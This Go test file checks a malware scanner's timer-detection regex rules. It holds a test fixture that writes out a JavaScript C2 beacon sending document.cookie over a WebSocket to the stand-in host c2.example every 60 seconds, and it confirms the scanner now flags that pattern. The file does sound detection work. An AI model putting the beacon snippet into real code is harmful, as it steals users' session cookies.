package main

import "testing"

// ruleNamed returns a shipped rule by name, for testing its regex in
// isolation. Going through a full scan would conflate the question "does
// this regex match?" with "is this capability paired?" — a lone capability
// is suppressed no matter what its regex does.
func ruleNamed(t *testing.T, name string) Pattern {
	t.Helper()
	s := NewScanner(".", FilterAll, false, map[string]struct{}{})
	for _, p := range s.Patterns {
		if p.Name == name {
			return p
		}
	}
	t.Fatalf("rule %q is not registered", name)
	return Pattern{}
}

// time-trigger matched setTimeout but not setInterval, and wanted a delay of
// six digits or more — at least 100 seconds. A periodic beacon is the
// commonest real use of a timer in malware and it uses setInterval with an
// interval measured in seconds.
func TestTimeTriggerCatchesIntervalsAndSeconds(t *testing.T) {
	re := ruleNamed(t, "time-trigger").Regex
	for _, c := range []struct{ name, content string }{
		{"setInterval-60s", `setInterval(fn, 60000);`},
		{"setInterval-5s", `setInterval(fn, 5000);`},
		{"setTimeout-5s", `setTimeout(fn, 5000);`},
		{"setTimeout-long", `setTimeout(fn, 3600000);`},
		{"sleep", `time.sleep(86400)`},
		{"cron", `# run via cron`},
	} {
		t.Run(c.name, func(t *testing.T) {
			if !re.MatchString(c.content) {
				t.Errorf("time-trigger regex did not match: %s", c.content)
			}
		})
	}
}

// A short delay is ordinary UI and retry code, not a scheduled trigger.
func TestTimeTriggerIgnoresShortDelays(t *testing.T) {
	re := ruleNamed(t, "time-trigger").Regex
	for _, content := range []string{
		`setTimeout(fn, 0);`,
		`setTimeout(fn, 100);`,
		`setInterval(tick, 16);`,
	} {
		if re.MatchString(content) {
			t.Errorf("time-trigger regex fired on a short delay: %s", content)
		}
	}
}

// End to end: the C2 beacon shape pairs time-trigger with websocket, two
// distinct capabilities, so the cluster rule reports it. Before this fix
// only websocket matched, leaving a lone capability that was suppressed.
func TestBeaconFixtureIsNoLongerSilent(t *testing.T) {
	content := "// Periodic C2 beacon exfiltrating cookies.\n" +
		"setInterval(function () {\n" +
		"  new WebSocket(\"wss://c2.example/s\").send(document.cookie);\n" +
		"}, 60000);\n"

	s := NewScanner(".", FilterAll, false, map[string]struct{}{})
	fired := firedPatterns(scanWith(t, "beacon.js", content, s.Patterns))

	if !fired["time-trigger"] || !fired["websocket"] {
		t.Errorf("beacon shape still silent; fired = %v", fired)
	}
}
